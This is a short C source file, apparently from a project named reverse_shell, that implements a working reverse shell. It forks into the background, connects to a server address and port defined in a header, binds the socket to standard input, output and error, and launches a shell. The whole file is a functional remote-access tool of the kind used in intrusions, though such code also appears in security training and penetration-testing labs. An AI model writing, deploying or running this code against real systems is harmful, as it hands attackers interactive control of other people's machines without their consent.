#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include "reverse_shell.h"

int	connect_client(int *client_fd)
{
	struct sockaddr_in	addr_server;

	*client_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (*client_fd < 0)
		return (1);
	addr_server.sin_family = AF_INET;
	addr_server.sin_port = htons(PORT);
	if (inet_pton(AF_INET, SERVER_HOST, &addr_server.sin_addr.s_addr) <= 0)
	{
		close(*client_fd);
		return (1);
	}
	if (connect(*client_fd, (struct sockaddr *)&addr_server, sizeof(addr_server)) < 0)
	{
		close(*client_fd);
		return (1);
	}
	return (0);
}

int	main(int argc, char **argv, char **envp)
{
	int	fd;

	(void) argc;
	(void) argv;
	if (fork() != 0)
		return (0);
	if (connect_client(&fd) != 0)
		return (0);
	char *args[] = {"/bin/sh", NULL};
	dup2(fd, 0);
	dup2(fd, 1);
	dup2(fd, 2);
	execve("/bin/bash", args, envp);
}
